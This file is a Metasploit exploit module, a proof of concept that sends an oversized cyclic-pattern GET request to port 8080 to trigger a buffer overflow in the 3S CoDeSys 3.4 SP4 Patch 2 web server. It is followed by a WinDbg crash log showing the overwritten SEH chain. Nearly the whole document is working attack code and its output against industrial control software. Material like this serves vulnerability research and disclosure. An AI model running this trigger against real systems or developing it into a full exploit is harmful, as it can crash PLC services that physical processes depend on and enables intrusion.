require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => '3S CoDeSys CmpWebServer PoC',
			'Description'    => %q{
					This module is simply a trigger for the 3S CoDeSys 3.4 SP4 Patch 2
				CmpWebServer buffer overflow.
			},
			'Author'         => [ 'Mario Ceballos' ],
			'License'        => 'BSD_LICENSE',
			'References'     =>
				[
					[ 'URL', 'http://aluigi.altervista.org/adv/codesys_1-adv.txt' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ '3S CoDeSys 3.4 SP4 Patch 2', { 'Ret' => 0x41414141 } ], 
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 29 2011'))

		register_options( 
			[ 
				Opt::RPORT(8080),
			 ], self.class )
	end

	def exploit

		trigger = pattern_create(8192)
		trigger[1113, 8] = [target.ret].pack('V') * 2

		res = send_request_raw(
			{
				'uri'		=> '/' + trigger + '/' + rand_text_alpha_upper(rand(5) + 1),
				'method'	=> 'GET',
				'version'	=> '1.0',
			}, 5)

	end

end
__END__
(134.6e0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=7cfefcfe ebx=00002008 ecx=000006d3 edx=326f4231 esi=02434e90 edi=02b60000
eip=00413915 esp=02b5f9dc ebp=02b5fa08 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\3S CoDeSys\GatewayPLC\CoDeSysControlService.exe
CoDeSysControlService+0x13915:
00413915 8917            mov     dword ptr [edi],edx  ds:0023:02b60000=????????
0:006> !exchain
02b5ffa4: 41414141
Invalid exception stack at 41414141
0:006> k
ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
02b5fa08 0040f7a3 CoDeSysControlService+0x13915
02b5fd54 41357241 CoDeSysControlService+0xf7a3
02b5fd58 72413672 0x41357241
02b5fd5c 38724137 0x72413672
02b5fd60 41397241 0x38724137
02b5fd64 73413073 0x41397241
02b5fd68 32734131 0x73413073
02b5fd6c 41337341 0x32734131
02b5fd70 73413473 0x41337341
02b5fd74 36734135 0x73413473
02b5fd78 41377341 0x36734135
02b5fd7c 73413873 0x41377341
02b5fd80 30744139 0x73413873
02b5fd84 41317441 0x30744139
02b5fd88 74413274 0x41317441
02b5fd8c 34744133 0x74413274
02b5fd90 41357441 0x34744133
02b5fd94 74413674 0x41357441
02b5fd98 38744137 0x74413674
02b5fd9c 41397441 0x38744137
0:006> dd esi
02434e90  42336f42 6f42346f 366f4235 42376f42
02434ea0  6f42386f 30704239 42317042 70423270
02434eb0  34704233 42357042 70423670 38704237
02434ec0  42397042 71423071 32714231 42337142
02434ed0  71423471 36714235 42377142 71423871
02434ee0  30724239 42317242 72423272 34724233
02434ef0  42357242 72423672 38724237 42397242
02434f00  73423073 32734231 42337342 73423473
